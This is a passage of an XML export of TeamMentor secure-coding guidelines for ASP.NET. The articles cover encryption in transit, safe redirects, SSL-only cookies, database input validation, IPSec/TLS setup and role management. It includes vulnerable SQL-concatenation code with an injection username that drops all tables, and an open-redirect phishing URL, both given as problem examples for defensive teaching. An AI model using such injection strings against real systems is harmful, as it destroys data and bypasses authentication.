      <Id>5b417ec2-f4d9-4571-82f1-813611cca26a</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Sensitive Data Over the Wire</Title>
      <Category>Sensitive Data</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Consider where items of sensitive data, such as credentials and application-specific data, are transmitted over a network link. Use a protocol that boasts adequate/strong encryption to protect said data. </p><h1>Why</h1><p>The internet is full of abstractions and layers. When data is sent over a wire, it typically passes through several intermediate relays on it's way towards&nbsp;some final destination. Using a safe protocol to transmit information is important because it adds protection against inadvertent eavesdropping and modification in mid transport. </p><h1>When</h1><p>This is appropriate whenever sensitive data needs to be sent between two hosts, whether it is using the public internet or a private LAN as a transmission medium. </p><h1>How</h1><p>If you need to send sensitive data between the Web server and browser, consider using SSL. If you need to protect server-to-server communication, such as between your Web server and database, consider IPSec or SSL.&nbsp;&nbsp;</p><h1>Related Items</h1><ul><li><a href="ruledisplay:a11d8cb9-767c-4307-8a53-4d0f61cc12fa">Sensitive Data is Not Stored in Cookies, Hidden Form Fields, or Query Strings</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1240136721" Content_Hash="-1956968452">
    <Metadata>
      <Id>5c75910d-7463-4da7-837d-916185d5dc43</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use Mapping Values When Redirecting on User Input</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Applications</li></ul><h1>What to Do</h1><p>Use mapping values to perform redirects or forwards based on user input.</p><h1>Why</h1><p>Using mapping values when performing redirects or forwards prevents malicious users from creating hyperlinks that use the redirects or forwards to point to pages other than those intended by the application design.</p><h1>When</h1><p>Use this guideline when writing a web application that uses redirects or forwards. Avoid using redirects or forwards in web applications, if possible.</p><h1>How</h1><p>Perform the following actions to calculate destinations of redirects and forwards based on mapping values:</p><ol><li><p><strong>Identify redirects and forwards.</strong> Review code to find all redirects and forwards.</p></li><li><p><strong>Enumerate destinations.</strong> Make a list of all destinations pointed to by redirects and forwards.</p></li><li><p><strong>Define mapping values.</strong> Define mapping values for all destinations used by redirects and forwards. A mapping value is a short identifying string that symbolically represents a resource.</p></li><li><p><strong>Rewrite redirects and forwards.</strong> Rewrite redirects and forwards to use mapping values as input to calculate the final destinations of redirects or forwards.</p></li></ol><h1>Problem Example</h1><p>Consider an on-line banking application that has an insecure redirect:</p><pre>http://www.onlinebank.com/redirect.asp?url=[destination]</pre><p>A phisher may create the following hyperlink to point to his own site and send it in spam messages to millions of people:</p><pre>http://www.onlinebank.com/redirect.asp?url=www.phisher.com</pre><p>When a user sees a link that appears to point to his bank at onlinebank.com in an e-mail message, he clicks that link and sees a web site that looks exactly like the bank's, but is actually a phishing web site used to steal authentication credentials. The user enters his account number and PIN into the web page, receives an error message telling him to try again, and is redirected to the bank's real site. After entering his credentials again, the user successfuly views his account. However, the phisher now has the user's online banking information.</p><h1>Solution Example</h1><p>The simplest solution&nbsp;is to get rid of the redirect altogether, but if it is necessary for application design, then mapping values may be used to mitigate this vulnerability. For example, if redirect.asp is used by the application to redirect to balance.asp, a mapping value called "balance" may be created to signify balance.asp. The page redirect.asp should then be rewritten to accept mapping values as input, instead of urls. The following url should then redirect to balance.asp:</p><pre>http://www.onlinebank.com/redirect.asp?map=balance</pre><p>However, the following malicious hyperlink will no longer work, because supplied input will not match any mapping value defined in the application:</p><pre>http://www.onlinebank.com/redirect.asp?url=www.phisher.com</pre><h1>Additional Resources</h1><ul><li>For more information about unvalidated redirects and forwards, please see <a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards">http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards</a> </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:c2f99851-794e-4cda-a1ee-71447d93bfc8">Don't Use Redirects or Forwards if Possible</a></li><li><a href="ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33">Validate Destinations of Redirects and Forwards</a></li><li><a href="ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7">URL Redirection Attack</a></li><li><a href="ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608">How to Test for URL Redirection Bugs</a></li><li><a href="ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178">Phishing Attack<br></a></li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1564656131" Content_Hash="1368633218">
    <Metadata>
      <Id>5d671ebe-781c-4de8-b1ef-f8e69fd13f73</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Restrict All Role Caching Cookies to HTTPS Connections</Title>
      <Category>Authorization</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use the <strong>cookieRequireSSL</strong> attribute to restrict role caching cookies to HTTPS connections if role caching is being used. </p><h1>Why</h1><p>Sending cookies out exclusively over SSL makes it much harder for an attacker to sniff the cookie values off the wire.&nbsp; If an attacker can get a copy of an authorization cookie, they can potentially emulate that role, allowing them to elevate their privilege in the system. </p><h1>When</h1><p>All systems which use authorization cookies should use SSL for those cookies if at all possible.&nbsp; Systems which deal with any personally identifiable information or monetary transaction should use SSL in all circumstances without exception. </p><h1>How</h1><p>Set the <strong>cookieRequireSSL</strong> attribute to true to specify that the authorization cookie with the role information should only be returned to the server over HTTPS connections.&nbsp; The following example shows a <strong>&lt;roleManager&gt;</strong> element configured to protect the authorization cookie. </p><pre>&lt;roleManager enabled="true"             <br>  cacheRolesInCookie="true"             <br>  cookieName=".ASPROLES"             <br>  cookieTimeout="30"             <br>  cookiePath="/"             <br>  cookieRequireSSL="true"             <br>  cookieSlidingExpiration="true"             <br>  cookieProtection="All"              <br>  createPersistentCookie="false"&gt;<br>&lt;/roleManager&gt;</pre><h1>Related Items</h1><ul><li><a href="ruledisplay:24e081c4-0c62-4c93-a91a-42a96892d74d">Use Role Caching if Role Store Lookups are too Costly</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1098795231" Content_Hash="1411818224">
    <Metadata>
      <Id>616fda5d-4e96-4bc0-8675-954794f52557</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate All Input Passed to Database</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Validate all input before it is passed to the database.</p><h1>Why</h1><p>Unvalidated input can lead to persistent cross-site scripting, SQL injection, and other vulnerabilities which would allow an attacker to gain unauthorized access to sensitive data.</p><h1>When</h1><p>If your application uses a backend database server.</p><h1>How</h1><p>To properly validate input passed to database:</p><ol><li><p><strong>Identify application inputs. </strong>Potential sources of input include:</p><ul><li>URL based parameters </li><li>Form based parameters </li><li>Hidden fields </li><li>Cookies </li><li>Local filesystem </li><li>Javascript variables</li></ul></li><li><p><strong>Identify database entry points.</strong> Find all the locations in the system where data is pushed into the database, either directly via queries, or indirectly (via log entries, etc). Trace all database entry points to find all the paths which can contain external input.</p></li><li><p><strong>Create a set of validators:</strong> Build a set of validators that work with the data in question and fit into the system architecture, including your general validation scheme for other data and the way the system interacts with the database. Using the <a href="ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909">Validate Input for Length, Range, Format, and Type</a> guideline, determine the appropriate validation at each validator. Centralize the validators as it helps strengthen your code by limiting the amount of scattered validation code throughout the system, and allows for easy auditing. Place the validators along the database input paths, ideally as close to the initial data input as possible. All data should pass through the validators before breing transmitted to the database servers.</p></li><li><p><strong>Use Type-Safe parameters in SQL statements:</strong> Stored procedures and Parameterized queries improve your application's robustness against SQL injection based attacks. Consult the guideline <a href="ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F">Use Type Safe SQL Parameters When Constructing SQL Queries</a>.</p></li><li><p><strong>Audit your entry paths.</strong> Before going into production, have a reviewer who was not responsible for the development of the code in question check all the input paths to ensure that the validators are correctly implemented, that they are correctly applied, and that all input paths are checked.</p></li></ol><h1>Problem Example</h1><p>The following code validates the user based on a given username and password. It hashes the password with a random salt. Then it compares the username and the produced hash against the data stored in the backend database. Unfortunately, the SQL query is dynamically crafted by using the user's input. If there is no proper input validation, an attacker can access the application's database server through the use of SQL injection.</p><pre>public boolean validateUser(String user, char[] pass)<br>{<br>      byte[] salt = MyApp.generateSalt();<br>      String passHash;<br>      SqlConnection cn;<br>      SqlCommand sqlCommand;<br>      String query;<br>      passHash = hashCredentials(pass, salt);<br>      // The application crafts the SQL query based on user's input<br>      cn = MyApp.getDBConnection();<br>      sqlCommand = new SqlCommand("select user from myappUsers where user = \""<br><br>      + user + "\" and pass = \"" + passHash + "\" and login_attempts &lt; 3;", cn);<br>      SqlDataReader reader = sqlCommand.ExecuteReader();<br>      updateLastLoginAttempt(user);<br>      ...<br>}</pre><p>If a user submits a login request with a username of 'foo\" or 1 = 1; drop table *; --', the system will happily first authenticate the user and then drop all the tables in the database.</p><h1>Solution Example</h1><p>The following code validates the user based on a given username and password. It hashes the password with a random salt. Then it compares the username and the produced hash against the data stored in the backend database. Because the application uses the Parameters property, it is much more difficult for an attacker to gain access to the application's database server through the use of SQL injection. </p><pre>public boolean validateUser(String user, char[] pass)<br>{<br>   byte[] salt = MyApp.generateSalt();<br>   String passHash; <br>   SqlConnection cn;<br>   SqlCommand sqlCommand;<br>   String query;     <br>   passHash = hashCredentials(pass, salt);<br>   // The application crafts the SQL query based on user's input<br>   cn = MyApp.getDBConnection();<br>   sqlCommand = new SqlCommand("select user from myappUsers where user = @user and <br>                    + pass = @passHash and login_attempts &lt; 3;", cn);<br>   sqlCommand.Parameters.Add("@user", SqlDbType.VarChar, user.Length).Value = user;<br>   sqlCommand.Parameters.Add("@passHash ", SqlDbType.VarChar, passHash.Length).Value = passHash;<br>   SqlDataReader reader = sqlCommand.ExecuteReader(); <br>   updateLastLoginAttempt(user);  <br>   ...<br>}</pre><p>Even if the user passes in an arbitrary string for a username or a password, they will not be able to alter the query or otherwise effect the database. An even better solution would involve using a stored procedure instead of a parameterized command, because that would permit the database to be locked down further.</p><h1>Additional Resources</h1><ul><li>To learn more about using regular expression for input validation, visit: <a href="http://msdn2.microsoft.com/en-us/library/ms998267.aspx">How To: Use Regular Expressions to Constrain Input in ASP.NET</a>. </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F">Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries </a></li><li><a href="ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909">Guideline: Validate Input for Length, Range, Format, and Type&nbsp;</a> </li><li><a href="ruledisplay:0FFC3880-7F2B-47A5-BC54-F9BD39117BDD">Guideline: Validate Input from All Sources </a></li><li><a href="ruledisplay:8F360E73-D932-4512-84B4-2D7A6632DA7F">Guideline: Use Stored Procedures </a></li><li><a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">Attack: SQL Injection Attack</a> </li><li><a href="ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6">Attack: Server-Side Code Injection Attack</a> </li><li><a href="ruledisplay:A61D6E7C-677C-463D-BB5D-7F36CAD4FF32">Checklist Item: All Database Input is Validated</a> <hr></li></ul><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1255877629" Content_Hash="1827996794">
    <Metadata>
      <Id>63bed887-fe89-4c08-a1ad-5bfa70ad52c4</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Disable the Session State Service if Unused</Title>
      <Category>Session Management</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>If the session state service is not used by your application, it should be disabled. </p><h1>Why</h1><p>By turning them off, you eliminate the redundant session processing performed by ASP.NET.&nbsp;</p><h1>How</h1><p>The session state can be&nbsp;turned off&nbsp;for an individual application by setting the <strong>mode</strong> attribute to "off" on the <strong>&lt;sessionState&gt;</strong> element in Web.config as follows.</p><pre>&lt;sessionstate mode="off" /&gt;<br></pre><h1>See Also</h1><ul><li>"Disable ASP Session State in ASP.NET" at <a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;306996">http://support.microsoft.com/default.aspx?scid=kb;en-us;306996</a> </li><li>"Configure SQL Server to Store ASP.NET Session State" at <a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;317604">http://support.microsoft.com/default.aspx?scid=kb;en-us;317604</a> </li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1373719704" Content_Hash="763854212">
    <Metadata>
      <Id>65a24726-461b-452d-ac91-cfbfad841419</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt Communication Links</Title>
      <Category>Communication Security</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Encrypt the communication channels when interacting with other software across the network.</p><h1>Why</h1><p>Encrypting the communication links allows the application to preserve confidentiality and integrity of the transmitted data.</p><h1>When</h1><p>If sensitive data must be transmitted between two hosts. The transmission could be between servers or between a client and a server.</p><h1>How</h1><p>To encrypt the communication links:</p><ol><li><p><strong>Identify the connections used for transmitting sensitive data.</strong> Enumerate all connections between the different entities. Identify the sensitive data that is sent over the network and the respective connections that are used for such communication. </p></li><li><p><strong>Choose the appropriate encryption mechanism.</strong> Depending on the infrastructure, you may consider using IPSec or TLS/SSL.</p><ul><li><p><strong>IPSec.</strong> IPSec is used when the encryption needs to be applied across all involved parties. Because IPSec is designed to secure connections between static hosts that are "always on", use IPSec to secure the network connections between your application's servers. Use the following steps to utilize IPSec:</p><ol><li><p><strong>Create an IP Filter.</strong> This restricts what computers can communicate with each other, and require that specific communication protocols are used. A filter consists of:</p><ul><li>A source IP address or range of addresses. </li><li>A destination IP address or range of addresses. </li><li>An IP protocol, such as TCP, UDP, or "any." </li><li>Source and destination ports (for TCP or UDP only).</li></ul></li><li><p><strong>Create Filter Actions.</strong> This procedure creates two filter actions. The first will be used to block all communications from specified computers and the second will be used to enforce the use of encryption between application server and database server computers.</p></li><li><p><strong>Create Rules.</strong> This procedure creates two new rules that will be used to associate the filter that you created in Procedure 1, with the two filter actions you created in Procedure 2.</p></li><li><p><strong>Export the IPSec Policy to the Remote Computer.</strong> The IPSec policy that you have created on the database server must now be exported and copied to the application server computer.</p></li><li><p><strong>Assign Policies.</strong> An IPSec policy must be assigned before it becomes active. Note that only one policy may be active at any one time on a particular computer.</p></li><li><p><strong>Verify that it Works.</strong> Use Network Monitor (netmon.exe) to verify that data sent between the two servers is encrypted.</p></li></ol></li><li><p><strong>TLS/SSL.</strong> TLS/SSL provides granular protection. This allows the traffic containing sensitive data only to be encrypted. Because TLS/SSL has a certificate based design, it allows the protection of data between mobile hosts. Use TLS/SSL to secure the communication channel between your application and its users. While .NET provides APIs for handling SSL encrypted traffic, it is recommended to follow the manuals associated with any third party software that is being used. If your application uses SSL, ensure that you use SSL 3.0 and disable the cryptographically weak SSL 2.0 protocols.</p><p>Use the following steps to configure IIS for using SSL:</p><ol><li><p><strong>Create a certificate request. </strong>Using the IIS management console, generate an SSL certificate request. This request is then sent to a Certification Authority to be signed. Follow these steps to generate the certificate request. </p><ol><li>Start the <strong>IIS management console</strong>. To do this, click on <strong>Control Panel</strong> -&gt; <strong>Administrative Tools</strong> -&gt; <strong>Internet Information Services</strong>. </li><li>Right click on your application's virtual host and select <strong>Properties</strong>. </li><li>Click on <strong>Server Certificate</strong> under the <strong>Directory Security</strong> tab. </li><li>Select <strong>Create a new certificate</strong> and click <strong>Next</strong>. </li><li>Select <strong>Prepare the request now, but send it later</strong> and click <strong>Next</strong>. </li><li>Provide <strong>your application's FQDN</strong> and the desired bit length for your SSL certificate's encryption key, and then click <strong>Next</strong>. </li><li>Provide <strong>your organization's details</strong> and click <strong>Next</strong>. </li><li>Provide <strong>your application's FQDN</strong> and click <strong>Next</strong>. </li><li>Provide <strong>your organization's location details</strong> and click <strong>Next</strong>. </li><li>Specify the location where you would like the IIS management console to store your application's certificate request. </li><li>Click <strong>Finish</strong> to complete the process.</li></ol></li><li><p><strong>Present the request to a Certification Authority (CA).</strong> If all conditions for obtaining an SSL certificate are met, the CA will produce a new SSL certificate based on the certificate request. Because the requirements for obtaining an SSL certificate depend on the Certification Authority, consult with the Certification Authority in regards to the administrative steps necessary for obtaining such certificate.</p></li><li><p><strong>Install the certificate.</strong> Follow these steps to properly install your application's SSL certificate.</p><ol><li>Start the <strong>IIS management console</strong>. To do this, click on <strong>Control Panel</strong> -&gt; <strong>Administrative Tools</strong> -&gt; <strong>Internet Information Services</strong>. </li><li>Right click on your application's virtual host and select <strong>Properties</strong>. </li><li>Click on <strong>Server Certificate</strong> under the <strong>Directory Security</strong> tab. </li><li>Select <strong>Process the pending request and install the certificate</strong> and click <strong>Next</strong>. </li><li>Specify the location of your application's SSL certificate and click <strong>Next</strong>. </li><li>Click <strong>Finish</strong> to complete the process. </li></ol></li></ol></li></ul></li><li><p><strong>Apply the appropriate encryption mechanism. </strong>Apply the encryption mechanism of choice at the appropriate locations in the code. Such locations include all functionality that establishes a connection between your application and another entity.</p></li></ol><h1>Problem Example</h1><p>The following code establishes a connection between two servers. Unfortunately, the communication is not encrypted and it is possible for an attacker to eavesdrop on the connection.</p><pre>public Stream Connect(string remoteHost, int remotePort)<br>{<br>    TcpClient client = new TcpClient(remoteHost, remotePort);<br>    NetworkStream netStream = client.GetStream();<br>    return netStream;<br>}</pre><h1>Solution Example</h1><p>The following code establishes a connection between two servers. Because the communication is encrypted the confidentiality of the data in transit is preserved and it is impossible for an attacker to eavesdrop on the connection.</p><pre>public Stream Connect(string remoteHost, int remotePort)<br>{<br>    TcpClient client = new TcpClient(remoteHost, remotePort);<br>    SslStream netStream = new SslStream(client.GetStream(), false,<br>               new RemoteCertificateValidationCallback(this.ValidateSSLCertificate));<br>    try<br>    {<br>        netStream.AuthenticateAsClient(remoteHost);<br>    }<br>    catch (AuthenticationException ae)<br>    {<br>        client.Close();<br>        throw ae;<br>    }<br>    return netStream;<br>}</pre><h1>Additional Resources</h1><ul><li>For more information about TLS, see: RFC for <a href="http://www.faqs.org/rfcs/rfc2246.html">Transport Layer Security</a>. </li><li>For a quick overview on IPSec, see: A publication on <a href="http://www.digisafe.com/products/pdf/IPSec_Primer.pdf">IPSec Primer</a>. </li><li>To learn more about using IPSec in a server farm, see: <a href="http://msdn2.microsoft.com/en-us/library/aa302413.aspx">How To: Use IPSec to Provide Secure Communication Between Two Servers</a>. </li><li>For more information about uses of IPSec, see: <a href="http://msdn2.microsoft.com/en-us/library/aa302366.aspx">How To: Use IPSec for Filtering Ports and Authentication</a>. </li><li>For more information about using IPSec for managing your server farm, see: <a href="http://support.microsoft.com/kb/816521">How To: Use IPSec Policy to Secure Terminal Services Communications in Windows Server 2003</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:FCB0A4AC-A559-430D-9145-08340EC73FED">Guideline: Protect Sensitive Data Over the Network </a></li><li><a href="ruledisplay:B9E7568A-907C-43C9-9CED-F0CCA09F76CB">Guideline: Use SSL When Transmitting Credentials </a></li><li><a href="ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D">Attack: Man in the Middle Attack</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:CBB29250-7ED3-4FDD-9B28-E3EE07EAF911">Attack: HTTP Replay Attack</a> </li><li><a href="ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD">Attack: Chosen Plaintext Attack</a> </li><li><a href="ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB">Attack: Chosen Ciphertext Attack</a> </li><li><a href="ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04">Attack: Traffic Analysis Attack</a> </li><li><a href="ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E">Attack: Key Bruteforce Attack</a> </li><li><a href="ruledisplay:B446B34C-8DEC-4F74-A392-C30D1719D90D">Attack: Trust Relationship Attack</a> </li><li><a href="ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197">Attack: Phishing Attack</a> </li><li><a href="ruledisplay:F4F69A8F-F164-4821-89D3-B49571922848">Checklist Item: Communication Links are Encrypted</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-645960511" Content_Hash="-1563309835">
    <Metadata>
      <Id>69cae495-2512-4216-b5d5-4e701ad6b65f</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use ASP.NET Role Manager for Roles Authorization</Title>
      <Category>Authorization</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use the ASP.NET role manager for role-based authorization instead of writing custom code. </p><h1>Why</h1><p>ASP.NET provides a role manager feature that automatically allows you to create, manage, and look up roles for the currently authenticated user.&nbsp; Role managers reduce possibilities for serious security issues from programmer errors and reduce the amount of custom code needed for an application. </p><h1>When</h1><p>If your application uses windows authentication&nbsp;or stores roles in SQL server you&nbsp;should use ASP.NET role managers.&nbsp; If you need an authorization scheme or a feature not present in the provided role managers, write a custom role manager instead of an entirely custom authorization scheme so you can leverage the existing interfaces. </p><h1>How</h1><p>Roles are accessed from the configured role store by the <strong>RoleManager</strong> HTTP module by using the configured role provider.&nbsp; This occurs after the user is authenticated but before URL authorization and file authorization access checks occur and before programmatic role checks can occur. </p><p>To use the role manager feature in an ASP.NET application, you need to do the following: </p><ol><li>Add a &lt;<strong>roleManager</strong>&gt; element beneath the &lt;<strong>system.web</strong>&gt; section of your application's Web.config file and enable role manager by setting its <strong>enabled</strong> attribute to <strong>true</strong>. </li><li>Add a connection string to the &lt;<strong>connectionStrings</strong>&gt; section to point to your roles store. If you are using the <strong>AuthorizationStoreRoleProvider</strong>, this is an LDAP query string pointing to your Authorization Manager Policy store in Active Directory or ADAM. If you are using the <strong>SqlRoleProvider</strong>, this is a database connection string that points to your role store database. </li><li>Configure the specific provider in the &lt;<strong>roleManager</strong>&gt;<strong> </strong>element in your application's Web.config file. The role manager system supports the following providers: </li><li>If your application roles are in an Authorization Manager Policy store in Active Directory or ADAM, use the <strong>AuthorizationStoreRoleProvider</strong>. </li><li>If your application roles are in a SQL Server database, use the <strong>SqlRoleProvider.</strong> </li><li>If your application uses Windows groups as roles, use the <strong>WindowsTokenRoleProvider</strong>. Note that this is recommended to be used with Windows Authentication only. </li><li>If your application roles are in a store other than those previously listed, create a custom roles provider inheriting <strong>RoleProvider</strong> base class. </li><li>Set the <strong>defaultProvider</strong> attribute on the &lt;<strong>roleManager</strong>&gt; element to the chosen role provider. </li></ol><p>To check roles and manage roles, use the Role Manager API (for example <strong>Roles.IsUserInRole </strong>and <strong>Roles.CreateRole</strong>). </p><p>If your application needs role-based authorization, use the following guidelines: </p><ul><li><p><strong>Use role providers to perform role authorization.</strong>&nbsp; Role providers allow you to load the roles for users without writing and maintaining code.&nbsp; Additionally, the role providers offer a consistent way for you to check the role membership of your users, regardless of the underlying data store.&nbsp; Where possible, use one of the supplied roles providers; these include <strong>SqlRoleProvider</strong>, <strong>WindowsTokenRoleProvider</strong>, and <strong>AuthorizationStoreRoleProvider</strong>.&nbsp; If you already have a custom role store in a non-SQL Server database or in a non-Active Directory LDAP store, consider implementing your own custom role provider. </p><p>The following code shows how to use the role manager API and specifically <strong>Roles.IsUserInRole</strong>. </p><pre>// Tests whether the currently authenticated user is a member<br>// of a particular role.<br>if(Roles.IsUserInRole("Manager"))<br>   // Perform restricted operation else<br>   // Return unauthorized access error.<br>// Tests whether any given user is a member of a role:<br>if(Roles.IsUserInRole("Bob","Manager"))<br>   // Perform restricted operation<br>else<br>   // Return unauthorized access error.</pre></li><li><p><strong>Use the SqlRoleProvider when your roles are in SQL Server.</strong>&nbsp; If you store role information in SQL Server, configure your application to use the <strong>SqlRoleProvider</strong>.&nbsp; You can also configure forms authentication with the <strong>SqlMembershipProvider</strong> to use the same database for authentication and authorization, although this is not required. </p></li><li><p><strong>Use the WindowsTokenRoleProvider when you use Windows groups as roles.</strong>&nbsp; If your application uses Windows authentication and you use Windows groups as roles, configure your application to use the <strong>WindowsTokenRoleProvider</strong>. </p></li><li><p><strong>Use the AuthorizationStoreRoleProvider when your application roles are in ADAM.</strong>&nbsp; If your application uses Windows authentication against Active Directory, and you need application specific roles instead of using your domain Windows group membership, you can store role information in SQL Server or in an Authorization Manager (AzMan) policy store in ADAM.&nbsp; Authorization Manager provides a Microsoft Management Console (MMC) snap-in, to create and manage roles, and to manage role membership for users. </p><p>If your user accounts are in Active Directory, but you cannot use Windows authentication and must use forms authentication, a good solution for roles management is to use the <strong>AuthorizationStoreRoleProvider</strong> with an AzMan policy store in ADAM. </p></li></ul><p><strong>Note:</strong>&nbsp;&nbsp;The <strong>AuthorizationStoreRoleProvider</strong> does not directly support Authorization Manager business logic such as operations and tasks. To do this, you must use P/Invoke and call the Authorization Manager API directly.&nbsp;&nbsp;</p><h1>Related Items</h1><ul><li><a href="ruledisplay:572ac2ef-647b-4cba-a976-7c285a6d475f"></a><a href="ruledisplay:4c4c6b17-c40f-4710-bd98-03693304ae78">Role Manager is used for Roles Authorization Rather than Custom Code</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="668511756" Content_Hash="-803092292">
    <Metadata>
      <Id>6e6f83a6-404b-441d-be4c-71f2726a7960</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Separate Public and Restricted Areas</Title>
      <Category>Authentication</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Author>
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Do</h1><p>You should Partition your Web Site so that secure pages that require authenticated access are placed in a subdirectory that is separate from the anonymously accessible pages.</p><h1>Why</h1><p>To prevent unauthenticated users from accessing the restricted pages. Any attempt to do so forces a Forms login.</p><h1>When</h1><p>If your Web application requires users to complete authentication before they can access specific pages, make sure that the restricted pages are placed in a separate directory away from publicly accessible pages. </p><h1>How</h1><h3>Separate Public and Restricted Areas</h3><p>A public area of your site can be accessed by any user anonymously. Restricted areas can be accessed only by specific individuals and the users must authenticate with the site. Consider a typical retail Web site. You can browse the product catalog anonymously. When you add items to a shopping cart, the application identifies you with a session identifier. Finally, when you place an order, you perform a secure transaction. This requires you to log in to authenticate your transaction over SSL.</p><p>By partitioning your site into public and restricted access areas, you can apply separate authentication and authorization rules across the site and limit the use of SSL. To avoid the unnecessary performance overhead associated with SSL, design your site to limit the use of SSL to the areas that require authenticated access.</p><p><strong>Note</strong> If you are using <strong>Server.Transfer</strong> in your application to transfer from an anonymous page to a secure page, the .NET Framework bypasses authentication checks, so code that uses <strong>Server.Transfer</strong> should be verified to ensure that it does not transfer to a secure directory.</p><p><strong>Consider Partitioning Your Web Site</strong></p><p>To avoid having to use SSL across your entire site, structure your Web site so that the secure pages that require authenticated access are placed in a subdirectory that is separate from the anonymously accessible pages. This approach is shown in following Figure 1</p><p><img 